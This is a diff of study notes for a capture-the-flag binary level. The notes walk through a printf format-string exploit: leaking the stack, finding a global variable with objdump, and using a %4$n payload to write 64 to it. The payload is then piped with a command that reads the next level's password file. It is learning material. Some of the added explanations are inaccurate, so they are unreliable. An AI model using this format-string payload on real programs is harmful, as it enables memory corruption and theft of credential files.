@@ -7,15 +7,16 @@
 Method:
 - do stack leakage
 - find in leakage the position of the buffer (find repetition and compare with hex ASCII table)
-- find the global variable (password)????
+- find the address global variable and its correct condition
 - find the padding
-- overwrite buffer with address of global variable and you will see 804988c on the 4th position
-- and pass 64 as its value
+- overwrite buffer and you will see 804988c on the 4th position
+- overwrite buffer with padding and put address of global variable instead of return address
+- and write 64 to the global variable
  
 Info:
 - positon of buffer in stack - 4
 
-- 0x804988c - address of global variable
+- 0804988c - address of global variable
 - 8c980408 - same in little-endian
 - same in hex - \x8c\x98\x04\x08
 - the password - 0x40 or 64
@@ -25,17 +26,25 @@ Info:
 
 Code:
 objdump -d ./level3
+objdump -t level3
  ./level3
 111111 %p %p %p %p %p
 (python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"';cat) | ./level3
 (python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'; echo "cat /home/user/level4/.pass") | ./level3
 
 QA
+- why the leakage of global varibale happens?
+- Printf has no specificators. If we pass %smth in the stdin, prinf will consider it as specificator. Printf will try to print arguments, when they end - prinf will use global variables
+
 - what is 0x200?
 
-- how do we know what there is a global variable
+- how to find a global variable?
+- objdump -t level3 -> 0804988c g     O .bss   00000004              m
 
 - why padding is 64?
+
+- how do we pass the global varibale?
+- "A" * 60 + "%4$n - here %n will write the number of preceding bytes (64) and put it the pointed location: the position of 4th argument (buffer)
 
 Functions
 
